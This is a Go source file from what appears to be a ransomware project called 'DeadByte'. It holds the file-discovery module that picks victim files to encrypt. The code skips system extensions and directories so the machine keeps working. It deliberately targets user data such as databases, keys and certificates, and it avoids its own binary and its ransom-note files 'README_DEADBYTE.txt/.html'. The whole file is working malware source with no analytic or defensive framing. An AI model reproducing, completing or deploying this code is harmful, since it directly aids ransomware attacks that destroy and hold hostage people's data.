// Package walker locates target files for encryption / decryption.
package walker

import (
	"io/fs"
	"os"
	"path/filepath"
	"strings"
)

// Options controls the file discovery.
type Options struct {
	Roots        []string
	ExtAllow     map[string]bool // empty = any extension
	ExtDeny      map[string]bool
	SkipDirs     []string        // path prefixes to skip
	SkipNameDirs map[string]bool // directory basenames (lowercase) to skip entirely
	SkipFiles    []string        // exact file names to skip
	MaxSize      int64
	SelfExe      string // running binary path (never encrypt it)
}

// DefaultDenyExts lists binary/system extensions never encrypted (OS must
// keep working; user data such as .db/.key/.pem/.crt IS encrypted).
func DefaultDenyExts() map[string]bool {
	exts := []string{
		".exe", ".dll", ".sys", ".so", ".dylib", ".app", ".dmg",
		".pkg", ".bin", ".iso", ".vmdk", ".vhd", ".vhdx", ".img",
		".mst", ".ocx", ".cpl", ".drv", ".pdb", ".efi", ".mui", ".msc",
		".evtx", ".etl", ".otf", ".woff", ".woff2", ".eot", ".fon",
		".msi", ".msp", ".cat",
		".tmp", ".lock", ".deadbyte",
	}
	m := make(map[string]bool, len(exts))
	for _, e := range exts {
		m[e] = true
	}
	return m
}

// DefaultSkipDirs are system/irrelevant paths never traversed.
func DefaultSkipDirs() []string {
	return []string{
		"/proc", "/sys", "/dev", "/boot", "/etc", "/usr", "/var", "/System",
		"/Library", "/Windows", "/Program Files", "/Program Files (x86)",
		"$Recycle.Bin", ".Trash", ".git", "node_modules", ".cache",
	}
}

// DefaultSkipNameDirs are directory basenames (compared lowercase) never
// traversed: profiles, caches and VCS/package-manager trees that would
// corrupt applications or bloat the run.
func DefaultSkipNameDirs() map[string]bool {
	names := []string{
		"appdata", "application data", "local settings",
		"library", ".localized", "lost+found",
		".trash", "$recycle.bin",
		".git", "node_modules", ".cache",
		".npm", ".yarn", ".gradle", ".m2", ".cargo", ".rustup",
	}
	m := make(map[string]bool, len(names))
	for _, n := range names {
		m[n] = true
	}
	return m
}

// DefaultDenyFiles are names never encrypted.
func DefaultDenyFiles() []string {
	return []string{
		"README_DEADBYTE.txt", "README_DEADBYTE.html", ".DS_Store",
		"NTUSER.DAT", "ntuser.dat.LOG1", "ntuser.dat.LOG2",
		"pagefile.sys", "hiberfil.sys", "swapfile.sys",
	}
}

func allowedExt(ext string, o Options) bool {
	if o.ExtDeny[ext] {
		return false
	}
	if len(o.ExtAllow) == 0 {
		return true
	}
	return o.ExtAllow[ext]
}

func skippedDir(path string, o Options) bool {
	for _, d := range o.SkipDirs {
		if d == "" {
			continue
		}
		if path == d || strings.HasPrefix(path, d+string(os.PathSeparator)) {
			return true
		}
	}
	return false
}

// Walk invokes onFile for every eligible file. It returns the number of
// eligible files found and the first error encountered (walk continues).
func Walk(o Options, onFile func(path string, size int64) error) (int, error) {
	var found int
	for _, root := range o.Roots {
		root = filepath.Clean(root)
		err := filepath.WalkDir(root, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return nil // skip unreadable entries
			}
			if d.IsDir() {
				if path != root && skippedDir(path, o) {
					return filepath.SkipDir
				}
				if path != root && len(o.SkipNameDirs) > 0 && o.SkipNameDirs[strings.ToLower(d.Name())] {
					return filepath.SkipDir
				}
				return nil
			}
			name := d.Name()
			ext := strings.ToLower(filepath.Ext(name))
			if !allowedExt(ext, o) {
				return nil
			}
			for _, f := range o.SkipFiles {
				if name == f {
					return nil
				}
			}
			if o.SelfExe != "" {
				abs, err := filepath.Abs(path)
				if err == nil && abs == o.SelfExe {
					return nil
				}
			}
			info, err := d.Info()
			if err != nil {
				return nil
			}
			if info.IsDir() || info.Mode()&fs.ModeSymlink != 0 {
				return nil
			}
			if o.MaxSize > 0 && info.Size() > o.MaxSize {
				return nil
			}
			found++
			if onFile != nil {
				if err := onFile(path, info.Size()); err != nil {
					return err
				}
			}
			return nil
		})
		if err != nil {
			return found, err
		}
	}
	return found, nil
}
